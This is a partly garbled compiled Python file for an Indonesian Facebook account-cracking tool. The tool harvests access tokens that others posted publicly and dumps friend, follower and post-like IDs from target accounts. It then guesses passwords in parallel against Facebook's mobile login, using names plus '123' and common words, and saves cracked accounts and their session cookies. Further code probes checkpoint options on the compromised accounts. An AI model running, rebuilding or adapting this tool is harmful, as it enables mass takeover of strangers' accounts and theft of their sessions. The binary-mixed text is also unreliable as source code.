o

    }�kb` �                
   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZzd dlZW n' e
y]   e�d� e�d� zd dlZW n
 e
yZ   ed� Y nw Y nw d dlmZ d dlmZ d dlmZ d dlmZ d d	lmZ d d
lmZ  d dlm!Z" d dl#m$Z% d d
l&m'Z( d dl)T d dl*m+Z+m,Z,m-Z-m.Z.m/Z/m0Z0m1Z1 ze2dd��3� �4� Z5W n   g d�Z5Y ze2dd��3� �4� Z6W n   g d�Z6Y ze2dd��3� �4� Z7W n   g d�Z7Y g g d d d g g g g g g g g f
\
Z8Z9a:a;a<Z=Z>Z?Z@ZAZBZCZDdZEdZFdZGdZHdZIdZJdZKdZLdZMd ZNdZOd!ZPd"ZQd#ZRd$ZSd%ZTd ZUd&ZMd'ZVd&ZWd"ZJd#ZXd#ZYd&ZZd'ZGd&Z[d"ZQd#Z\d$Z]d Z^d Z_d#ZKd(Z`d)Zae�beTeQeUeKeSg�ZcdZdd*d+d,d-d.d/d0d1d2d3d4d5d6�Zed*d+d,d-d.d/d0d1d2d3d4d5d7�Zfej�g� jhZieeejej�g� jk� Zlej�g� jmZnd8ejei� d9 ejel� d9 ejen� d: Zod;ejei� d9 ejel� d9 ejen� d: Zpd<d=� Zqd>d?� Zrd@dA� ZsdBdC� Zte �u� ZvdDdE� ZwdFdG� ZxdHdI� ZydJdK� ZzdLdM� Z{dNdO� Z|dPdQ� Z}dRdS� Z~dTdU� ZdVdW� Z�dXdY� Z�dZd[� Z�d\d]� Z�d^d_� Z�d`da� Z�dbdc� Z�ddde� Z�dfdg� Z�dhdi� Z�djdk� Z�dldm� Z�dndo� Z�dpdq� Z�drds� Z�dtdu� Z�dvdw� Z�dxdy� Z�dzd{� Z�d|d}� Z�d~d� Z�e�d�k�rDew�  dS dS )��    Nzpip install rich�   zKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich))�Table)�Console)�
BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�*)�Key�Helpers�Message�Product�Customer�Data�AIzuser.txt�r)z�Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16z	user2.txt)z~Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36ziMozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1z�Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I9100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16z	user3.txt)z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)z�Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36z{Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 YandexSearch/7.16z[mz[93mz[1;92mz[32mz[95mz[33mz[1;96mz[0;34mz[0;00mz[0;33mz[0mz[0;32mz[0;36mz[0;31mz[0;35mz[00mz[0;90mz[1;94mu   [•]ZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�1�2�3�4�5�6�7�8�9�10�11�12)�01�02�03�04�05�06�07�08Z09r   r   r    zOK-�-z.txtzCP-c                   C   s   t �d� d S )N�clear)�os�system� r-   r-   �zero.pyr*   T   s   r*   c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g{�G�z�?)�sys�stdout�write�flush�time�sleep)�z�er-   r-   r.   �jalanW   s   2r8   c                   C   s
   t �  d S )N)�loginr-   r-   r-   r.   �back[   s   
r:   c                  C   sJ   t �  d} t| dd�}t� j|dd� d}t|dd�}tt|dd�� d S )Nz# SELAMAT DATANG DI TOOLS ZERO�cyan�Zstyle�on redz|AUTHOR    :  Rizqi Muhammad Fajar
GITHUB    :  https://github.com/ZERO-1313
WHATSAPP  :  085693439427
VERSION   :  2.0 [NEW]zINFORMASI PENGEMBANG��title)r*   �mark�solr	   �nel�cetak)ZwelZwel2ZauZpengembang1r-   r-   r.   �banner^   s   rD   c                  C   s�   t �  t�  t�  d} t� �t| dd�� d}t|dd�}tt|dd�� tt	d t
 d	 t	 d
 �}|dv r<t�  d S |dv rEt�  d S |d
v rNt
�  d S |dv rWt�  d S d}t� �t|dd�� t�  d S )Nz# PILIH METHOD LOGIN�greenr<   zX[01] Login Dengan Token Facebook
[02] Token Gratis (Belum Tentu Selalu Bisa)
[03] Keluarr;   �METHODr>   �[z<->�
] Pilih : �r   r!   �r   r"   �r   r#   �r   r$   �# PILIHAN TIDAK ADA DI MENU�red)rD   �ala�cekinrA   r	   r@   rB   rC   �input�x�pr9   �
free_token�email_pw�exit)�cek�kayes�kis�menu�ricr-   r-   r.   �mot_logi   s(   




r\   c                  C   sL   d} t �| �j�d�}t|d�}|jddd�D ]}d|jv r#|�d� qd S )	N�Hhttps://free.facebook.com/100040708001839/posts/716737126359881/?app=fblzutf-8�html.parser�aT)�hrefu   Lihat komentar sebelumnya…r`   )�ses�get�text�encode�parser�find_all)Zlinkr   Zpar�nr-   r-   r.   �get_tkn�   s   


��rh   c               
   C   s�  d} g }ddg}|D ]�}t �|�}t�d|j�}|D ]�}| d7 } t|�dk�r|�|� zt �d|� ���� d }t �d|� ���� d	 }W n   d
}d}Y z*g }	t�d| �}
t�	|
j�d
 }|d D ]}z|d	 }
|	�|
� W qe   Y qeW n	 t
y�   Y nw dt|	� }|dks�d|kr�dt� dt� d�}n	dt� |� t� �}|d
kr�dt
� dt� �}ndt� dt� �}tdt
� t|�� t� dt� |� t� �� tdt� d|� �� tdt� d|� �� tdt� d|� �� tdt� �� tdt� dt� |� t� �� td� td� qq
tdt� d t� d!t� dt� d"t� d#t� ��}td$� |d%v �r.t�  d S zt|�}W d S    td&� t�d� t�  Y d S )'Nr   r]   zIhttps://free.facebook.com/100001621584081/posts/5222617491135585/?app=fblzEAA\w+r   �%   z,https://graph.facebook.com/me?&access_token=�name�idz	Error 404r)   zJhttps://graph.facebook.com/me?fields=friends.fields(id,name)&access_token=�friends�dataz%s�0zTidak Memiliki Teman (ZSad�)zTeman : zMati/Z
KadaluarsazOn/zNon KadaluarsarG   z]-->Nama : � zStatus Token : zJumlah Teman : zIdz Akun     : zToken : �   ¥z] Salin Token & ZEnter�]z |)� rp   z Masukan Angka Bukan Huruf...)ra   rb   �re�findallrc   �len�append�json�requests�loads�KeyError�O�Q�K�Ir	   �warrQ   �M�U�Hr9   �intr8   r4   r5   r\   )ZnumZ	freetokenZurl_xZlink_Zllink_tokenZttoken_freeZnnaaZnamaxZidzZgoblokr   r6   �iZFanak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontolZ_idZtmnx�sts�pilZxakar-   r-   r.   rT   �   sl   �


�(��,&

rT   c                  C   sb   t �  d} t| dd�}t� j|dd� ttd t d t d �}ttd t d t d �}d S )	Nz # LOGIN MENGGUNAKAN AKSES COOKIErE   r<   r;   rG   �fz
] EMAIL : z] KATA SANDI : )rD   r@   rA   r	   rQ   rR   rS   )�sky�sky2ZpantaZpanter-   r-   r.   rU   �   s    rU   c                  C   s�   z_t dd��� } t�| � z"t�dtd  �}t�|j�d }t�|j�d }t	||� W W d S  t
y=   t�  Y W d S  tjj
y_   t�  d}t|dd	�}t� j|d
d	� t�  Y W d S w  tyl   t�  Y d S w )N�
.token.txtr   �+https://graph.facebook.com/me?access_token=r   rj   rk   �2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIrN   r<   r;   )�open�read�tokenkurw   ry   rb   rx   rz   rc   rZ   r{   �
login_lagi�
exceptions�ConnectionErrorrD   r@   rA   r	   rV   �IOError)�tokenZsyZsy2Zsy3�li�lor-   r-   r.   r9   �   s(   
��r9   c            
      C   s(  t �  d} t| dd�}t� j|dd� ttd t d t d �}tdd	��|�}z*t	�
d
| �}t�|j
�d }d}t|dd�}t� j|dd� t�d
� t�  W d S  tyu   d}t|dd�}t� j|dd� t�d
� t�  Y d S  t	jjy�   d}t|dd�}	t� j|	dd� t�  Y d S w )Nz# LOGIN MENGGUNAKAN AKSES TOKENrE   r<   r;   rG   r�   z
] Token : r�   �wr�   rk   z)# Login Sukses, Jalankan Ulang Scriptnya!g      @z"# Login Gagal, Periksa Token Anda!rN   r�   )rD   r@   rA   r	   rQ   rR   rS   r�   r2   ry   rb   rx   rz   rc   r4   r5   rV   r{   r�   r�   r�   )
r�   r�   Zpanda�akunZtesZtes3ZsueZsuur�   r�   r-   r-   r.   r�   �   s4   

�r�   c                 C   sv  z	t �d��� }W n   ddi}Y z%t�d�d }ttt�d�d � }t�d�d }|d | d | }W n   d}Y t�  t�  t	�  d	}t
|d
d�}t� �|� tt
d t d
 t
 d t| � � tt
d t d
 t
 d t|� � tt
d t d
 t
 d t|� � tt
d t d
 t
 d t|d � � d}	t|	dd�}
tt|
dd�� tt
d t d t
 d �}|dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv �r*t�d � tt
d t d
 t
 d! � t�d� d"}t� �t
|d
d�� t�  d S d#}
t� �t
|
d$d�� t�  d S )%Nzhttps://httpbin.org/ip�originr)   �/r   r   �   rp   z# MENU TOOLSrE   r<   rG   �   •z] Active User : z] User Id     : z] User Ttl    : z] Ip Address  : z�[01] Crack Dari Pertemanan Publik
[02] Crack Dari Pertemanan Publik (Massal)
[03] Crack Dari Follower
[04] Crack Dari Follower (Massal)
[05] Crack Dari Like Postingan
[06] Cek Result Crack
[07] Cek Opsi Checkpoint
[00] Logutr;   ZMENUr>   z<>rH   rI   rJ   rK   rL   �r   r%   �r   r&   �r   r'   �rn   Z00zrm -rf .token.txtz
] Wait ...z# BERHASIL LOG OUTrM   rN   )ry   rb   rx   Zmy_birthday�split�dic2�strrD   rO   rP   r@   rA   r	   rR   �hrB   rC   rQ   rS   �dump_publik�dump_massal�dump_followers�folow_massal�	dump_like�result�filer+   r,   r4   r5   rV   )Zmy_nameZmy_id�shZtglxZblnxZthnxZbirthZsgZfx�ioZoiZjh�swr[   r-   r-   r.   rZ      s\   $$$(











rZ   c               	   C   s�  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv �r�zt�	d�}W n t
yS   d
}t � �t|dd�� t�d� t
�  Y nw t|�dkrpd}t � �t|dd�� t�d� t
�  d S d}t � �t|dd�� d}i }	|D ]o}
ztd|
 d��� }W n   Y q�|d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � q�d}
t � �t|
dd�� ttd t d	 t d
 �}z|	| }W n t�y+   d}t � �t|dd�� t�  Y nw ztd| d��� }W n   d}t � �t|dd�� t�d� t
�  Y d}t � �t|dd�� t�d | �}d}t � �t|dd�� ttd t d! t d" � t
�  d S |d#v �r�zt�	d$�}W n t
�y�   d
}t � �t|dd�� t�d� t
�  Y nw t|�dk�r�d%}t � �t|dd�� t�d� t
�  d S d&}t � �t|dd�� d}i }	|D ]s}
ztd'|
 d��� }W n   Y �q�|d7 }|d(k �r+dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � �q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � �q�d}
t � �t|
dd�� ttd t d	 t d
 �}z|	| }W n t�y�   d}t � �t|dd�� t�  Y nw ztd'| d��� }W n   d}t � �t|dd�� t�d� t
�  Y d)}t � �t|dd�� t�d*| �}d)}t � �t|dd�� ttd t d! t d" � t
�  d S |d+v �r�t
�  d S d}t � �t|dd�� t�  d S ),Nz# CEK RESULT CRACKrE   r<   z8[01] Cek Hasil Cp
[02] Cek Hasil Ok
[00] Kembali Ke Menur;   ZRESULTSr>   rG   �?rH   rI   �CPz# DIREKTORI TIDAK DITEMUKANrN   r�   r   z# ANDA BELUM MEMILIKI RESULT CP�yellowz# HASIL CP ANDA�CP/r   r   �
   rn   �] � ---> � Akunz # PILIH RESULT UNTUK DITAMPILKANrM   �+# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGIz# LIST AKUN CP ANDAz
cd CP && cat r�   z	] KembalirJ   �OKz# ANDA BELUM MEMILIKI RESULT OKz# HASIL OK ANDA�OK/�d   z# LIST AKUN OK ANDAz
cd OK && cat r�   )rA   r	   r@   rB   rC   rQ   rR   rS   r+   �listdir�FileNotFoundErrorr4   r5   r:   rv   r�   �	readlinesr�   �updater{   rV   r�   r,   r�   )rW   rX   rY   ZkzZvinZgadaZhahaZgerr�cih�lol�isi�hem�nomZgerr2�geeh�gehr[   �lin�heher�   ZhusZakun2r-   r-   r.   r�   2  s�   


�


.2
�




�


04
�




r�   c                  C   s"   d} t � �t| dd�� t�  d S )Nz
# NEXT UPDATErE   r<   )rA   r	   r@   rV   �rO   r-   r-   r.   �son�  s   
r�   c                  C   s   d} t � �t| dd�� d S )Nz# INFORMASI LISENSI KAMUrE   r<   )rA   r	   r@   r�   r-   r-   r.   rO   �  s   rO   c                  C   s4  d} t � jt| dd�dd� ttd t d t d � t�d� d	}t � �t|d
d�� g }zt�d�}|D ]}|�	|� q7W n   Y zt�d�}|D ]}|�	|� qMW n   Y t
|�d
krrd}t � �t|dd�� t�  d S d
}i }	|D ]�}
ztd|
 d��
� }W n   ztd|
 d��
� }W n   Y Y qxY |d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt
|�� d t � qx|	�t|�t|
�i� tdt|� d |
 d tt
|�� d t � qxd	}
t � �t|
d
d�� ttd t d t d �}z|	| }W n t�y2   d}t � �t|dd�� t�  Y nw ztd| d��
� }|D ]}t�	|�dd�� �q?t�  W d S  t�y�   ztd| d��
� }|D ]}t�	|�dd�� �qet�  W Y d S  t�y�   d}t � �t|dd�� t�d� t�  Y Y d S w w )Nz# CEK OPSI DARI FILEr;   r<   r=   rG   r�   z*] Sedang Membaca File, Tunggu Sebentar ...r�   z# PILIH FILE YG AKAN DI CEKrE   r�   r�   r   z(# ANDA BELUM MEMILIKI RESULT UNTUK DICEKrN   r�   r   r�   r   r�   rn   r�   r�   r�   r�   rH   rM   r/   rs   r�   )rA   r	   r@   rR   r�   r4   r5   r+   r�   rw   rv   rV   r�   r�   r�   r�   rQ   rS   r{   r�   �replace�cek_opsir�   r:   )Ztek�teksZmy_filesZlisZktZmerZtyZyyr�   r�   r�   r�   r�   �teks2r�   r�   r[   ZhfZfzr�   r-   r-   r.   r�   �  s�   

�
�
�.2
�
��r�   c            
   	   C   �  z	t dd��� } W n ty   t�  Y nw d}t|dd�}t� �|� ttd t d t d � t	td t
 d	 t d
 �}zFt�d| d t
d
  ��� }|d d D ]}zt�|d d |d  � W qV   Y qVttd t d t d ttt�� � t�  W d S  tjjy�   d}t|dd�}t� j|dd� t�  Y d S  ttfy�   d}t|dd�}	t� �|	� t�  Y d S w )Nr�   r   z# DUMP ID PUBLIKrE   r<   rG   r�   �*] Ketik "me" Jika Ingin Dump ID Dari Temanr�   �] Masukkan ID Target : � https://graph.facebook.com/v2.0/�)?fields=friends.limit(5000)&access_token=r   rl   rm   rk   �|rj   �
] Total : r�   rN   r;   z*# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK�r�   r�   r�   rV   r@   rA   r	   rR   r�   rQ   rS   ry   rb   r�   rx   rk   rw   r�   rv   �settingr�   r�   r{   )
r�   �win�win2r�   Zkoh2�pir�   r�   r�   r�   r-   r-   r.   r�   �  �8   
� 
(�r�   c            
   	   C   r�   )Nr�   r   z# DUMP ID FOLLOWERSrE   r<   rG   r�   �6] Ketik "me" Jika Ingin Dump ID Dari Followers Sendirir�   r�   �https://graph.facebook.com/�B?fields=name,subscribers.fields(id,name).limit(5000)&access_token=r   �subscribersrm   rk   r�   rj   r�   r�   rN   r;   z-# FOLLOWERS TIDAK DI TEMUKAN ATAU TOKEN RUSAKr�   )
r�   r�   r�   r�   Zkoh4r�   r�   r�   r�   r�   r-   r-   r.   r�   
  r�   r�   c               
   C   �F  d} t | dd�}t� �|� ttd t d t d � ztttd t d t d ��}W n tyH   d	}t |d
d�}t� �|� t	�  Y nw |dk sQ|dkrbd
}t |d
d�}t� �|� t	�  t
�� }d}ttd t d t d � t|�D ]!}|d7 }ttd t t
|� t d t
|� d �}t�|� qztD ]_}	z5|�d|	 d td  ��� }
|
d d D ]}z|d d |d  }|tv r�nt�|� W q�   Y q�W q� ttfy�   Y q� t
jjy�   d}
t |
d
d�}t� j|dd� t	�  Y q�w dtt� }tt�dk�rt |d
d�}nt |dd�}t� �|� t�  d S )Nz# DUMP ID FOLLOWERS MASSALrE   r<   rG   r�   �] MASUKKAN JUMLAH ID (LIMIT 10)r�   �] BERAPA ID : �&# INPUT YANG ANDA MASUKKAN BUKAN ANGKArN   r   r�   �# OUT OF RANGE MENr   r�   �] Masukkan ID Ke � : r�   r�   r�   rm   rk   r�   rj   r�   r;   �# BERHASIL MENGUMPULKAN %s ID�r@   rA   r	   rR   r�   r�   rQ   rS   �
ValueErrorrV   ry   �Session�ranger�   �uidrw   rb   r�   rx   rk   r{   r�   r�   r�   rv   r�   �r�   r�   ZjumZpesanZpesan2ra   Zyz�met�klZuserr�col�miZisor�   r�   ZtotZtot2r-   r-   r.   r�   *  �b   $
�,

�
�
�
r�   c            	      C   sH  z�ddt dd��� dd�} t�� ��}|jd| d��� d	 }|d
 }|d }|d }|d
 �d�d �d�}|d �d�d �d�}tt� dt	� dt� dt	� dt
� d|� d�� tt� dt	� dt� dt	� dt� d|� d�� tt� dt	� dt� dt	� dt� d|d � d|d � d|d � �� tt� dt	� dt� dt	� dt� d|d � d|d � d|d � �� tt� dt	� dt� dt	� dt� d�
� W d   � W d S 1 s�w   Y  W d S  t
tfy�   tt	� dt� dt	� dt� d �� t�d!� t�d"� t�  Y d S  t�y# } ztt	� dt� dt	� dt� d|� �	� W Y d }~d S d }~ww )#N�LWyIxNTg0NDQ0MSIsInhpOGpkMndxQTNrSTBvUlBONjJSc01Ya3pHdmtSbTdyMkdDUXZwKzgiXQ==�14731�KEY/lisensi.txtr   T�r�   Z	productid�keyZsigin�+https://app.cryptolens.io/api/key/activate?��params�
licenseKeyZcustomerrj   �email�created�Tr   r)   �expiresrG   r   rr   z
 Nama    :rp   z
 Email   :�
 Created :r�   r�   r   �
 Expired :z
 Status  :z PREMIUM�!z Lisensi Invalidzrm -rf KEY/lisensi.txt�   )r�   r�   ry   r�   rb   rx   r�   r	   �B�PrS   r~   rR   r{   r�   r�   r+   r,   r4   r5   �
__apikey__�	ExceptionrV   )	Z_header�s�reqZreserj   r�   �
resp_split�
resq_split�errr-   r-   r.   rP   [  s8   �
,,BB(&� 

2��rP   c            
   	   C   r�   )Nr�   r   z# DUMP ID LIKE DARI POSTINGANrE   r<   rG   r�   z'] Perlu Di Ingat Postingan Wajib Publikr�   z] Masukkan ID Postingan : r�   z>?fields=name,likes.fields(id,name).limit(999999)&access_token=r   Zlikesrm   rk   r�   rj   r�   r�   rN   r;   z-# POSTINGAN TIDAK DI TEMUKAN ATAU TOKEN RUSAKr�   )
r�   r�   r�   ZwowZaqmr�   r�   r�   r�   r�   r-   r-   r.   r�   y  r�   r�   c               
   C   r�   )Nz# DUMP ID PUBLIK MASSALrE   r<   rG   r�   r�   r�   r�   r�   rN   r   r�   r�   r   r�   r�   r�   r�   r�   rl   rm   rk   r�   rj   r�   r;   r�   r�   r�   r-   r-   r.   r�   �  r�   r�   c                  C   sd  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv r9tD ]}t	�
|� q0n7|dv rItD ]}t	�d
|� q?n'|dv ratD ]}t�
d
tt	��}t	�||� qOnd}t � �t|dd�� t�  d}t � �t|dd�� d}t|dd�}	tt|	dd�� ttd t d	 t d
 �}
|
dv r�t�
d� nA|
dv r�t�
d� n7|
dv r�t�
d� n-|
dv r�t�
d� n#|
dv r�t�
d� n|
dv r�t�
d� n|
dv r�t�
d� nt�
d � d!}t � �t|dd�� ttd t d	 t d" �}|d#v �r
t�
d$� nt�
d%� ttd t d	 t d& �}
|
d#v �r(t�
d$� nt�
d%� t�  d S )'Nz# SETTING URUTAN IDrE   r<   z�[01] Crack Dari Akun Tertua (Not Recommended)
[02] Crack Dari Akun Termuda (Recommended)
[03] Acak Urutan ID (Highly Recommended)r;   ZSETTINGr>   rG   r�   rH   rI   rJ   r   rK   rM   rN   z# PILIH METHOD CRACKz�[01] Methode B-Api V1
[02] Methode Mobile V1
[03] Methode Mobile V2
[04] Methode Mbasic V1
[05] Methode Mbasic V2
[06] Methode X-FB V1 (NEW)
[07] Methode WIFI V1 (beta)
[08] Methode WIFI V2 (beta)rF   �apirL   �freer�   �mbasic�touchr�   �X_fbr�   �wifi)r   r(   �wifi_v2�mobilez# PILIHAN OPSI CRACK z'] Tampilkan Aplikasi Tertaut ? (y/t) : ��y�Y�ya�noz9] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : )rA   r	   r@   rB   rC   rQ   rR   rS   rk   �id2rw   �insert�random�randintrv   rV   �method�	taplikasi�oprek�passwrd)Zwlr�   Ztak�huZbacotZxxr[   r�   ZiozZgessZhcZguwZaplikZoskr-   r-   r.   r�   �  sl   ���





r�   c                  C   st  d} t � �t| dd�� dttf }tt|dd�� d}t � �t|dd�� td	d
���}tD ]�}|�	d�d |�	d�d
 �
� }}|�	d�d }g d�}t|�dk rot|�dk rYn<|�|d � |�|d � |�|d � n&t|�dk r{|�|� n|�|� |�|d � |�|d � |�|d � dt
v r�|�t||� q.dt
v r�|�t||� q.dt
v r�|�t||� q.dt
v r�|�t||� q.dt
v r�|�t||� q.dt
v r�|�t||� q.dt
v r�|�t||� q.dt
v r�|�t||� q.|�t||� q.W d   � n	1 �sw   Y  td� d}	t � �t|	dd�� ttd t d  t d! �}
|
d"v �r5t�  d S t�  d S )#Nz3# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTIrE   r<   z?Hasil Live  Disimpan Ke : OK/%s
Hasil Check Disimpan Ke : CP/%sZCRACKr>   z.# HIDUPKAN/MATIKAN MODE PESAWAT SETIAP 5 MENITr�   �   )Zmax_workersr�   r   r   rp   )ZsayangZsayangkuZ	sayang123Z	bismillahZanjingZ	katasandiZsandi123�   r  Z123Z1234Z12345r  r
  r  r  r  r  r  r  rs   z"# INGIN MENGECEK OPSI HASIL CRACK?rG   r�   z.] Ingin Menampilkan Opsi Hasil Crack? (y/t) : r  )rA   r	   r@   �okc�cpcrC   rB   �tredr  r�   �lowerrv   rw   r  �submit�crack�crack2�crack3�crack4�crack5�crack6�crack7�crack8rQ   rR   rS   r�   rV   )ZlerZkrek�leZpoolZyuzong�idfZnmfZfrs�pwvZtanyaZwoir-   r-   r.   r!    sb   "
��&


r!  c           .      C   �  t �ttttttg�}td t	t
� }d}td|tt	t
�tt
t|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]}�z�t�� }	|j�dd|ddd	d
ddd
dddd�
� |�d�j}
t�dt|
���d�t�dt|
���d�| d|dd�}|j�ddddd|dd	d
ddd
dddd�� |j d|dd�}d |j!�"� �#� v r�d!t$v r�t%�&| d" | � t'| |� n7td#� d$| � d%|� �}
t(|
d&d'�}t)t(|d(d)�� t*d*t+ d+��,| d" | d# � t%�&| d" | � t
d7 a
W  �nTd,|j!�"� �#� v �r2d-d.i}d/t-v �rStd7 a|j!�"� }d0�.d1d2� |j!�"� �/� D ��}t*d3t0 d+��,| d" | d" | d# � td#� d$| � d4|� d5|� �}t(|d6d'�}t)t(|d7d)�� W  �n�d!t-v �r1td7 a|j!�"� }d0�.d8d2� |j!�"� �/� D ��}t*d3t0 d+��,| d" | d" | d# � | }d9}t�� }|jd:||d;�j}t�1d<t|��d= }|jd>||d;�j}|jd?||d;�j}|jd|� d@�||d;�j}|jdA|� dB�||d;�j}zt�1dCt|��d= }W n   d9}Y zt�1dDt|��d= �2dEdF�}W n   d9}Y zt�1dGt|��d= }W n   d9}Y zt�1dHt|��d= } W n   d9} Y zt�1dIt|��d }!W n   d9}!Y zd9}"t�1dJt|��}#|#D ]	}$|"|$dK 7 }"�q;W n   Y |dL|� dM| � dN|!� dO|� dP|� dQ|"� dR|� d#�7 }dS\}%}&|jdT||d;�j}'|jdU||d;�j}(dVt�1d<t|'��v �r
|dW7 }dX|'v �r�|dY7 }n5|t� dZ�7 }t�1d[t|'��})t�1d\t|'��}*|)D ]}+|%d7 }%|d]|%� d^|+� d|*|& � d#�7 }|&d7 }&�q�d_|(v �r�|d`7 }n;dS\}%}&|t� da�7 }t�1d[t|(��},t�1d\t|(��}-|,D ]}+|%d7 }%|d]|%� d^|+� d|-|& � d#�7 }|&d7 }&�q�n	 td#� d$| � d4|� d5|� d#|� �}t(|d6d'�}t)t(|d7d)�� W  nnW q@W q@ tj3j4�yF   t�5db� Y q@w td7 ad S )cNr�   �%z+
%s<-> %s/%s <-> OK:%s <-> CP:%s <-> %s%s%srp   ��end�m.facebook.comr   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�document�https://m.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8�
�Host�upgrade-insecure-requests�
user-agent�acceptZdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-language�lhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"�login_no_pin�8https://developers.facebook.com/tools/debug/accesstoken/��lsd�jazoestr�   Zflow�pass�next�	max-age=0�https://m.facebook.com�!application/x-www-form-urlencoded�rD  �
cache-controlrE  r�   �content-typerF  rG  rH  rI  rJ  rK  rL  rM  rN  rO  �Chttps://m.facebook.com/login/device-based/validate-password/?shbl=0F�rm   �allow_redirects�
checkpointr  r�   r/   �   [•] ID       : �    [•] PASSWORD : rN   r<   r�   r>   r�   r_   �c_userrF  ��Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36r  �;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr-   ��.0r�   �valuer-   r-   r.   �
<listcomp>[  �    zcrack.<locals>.<listcomp>r�   �   
[•] PASSWORD : �   
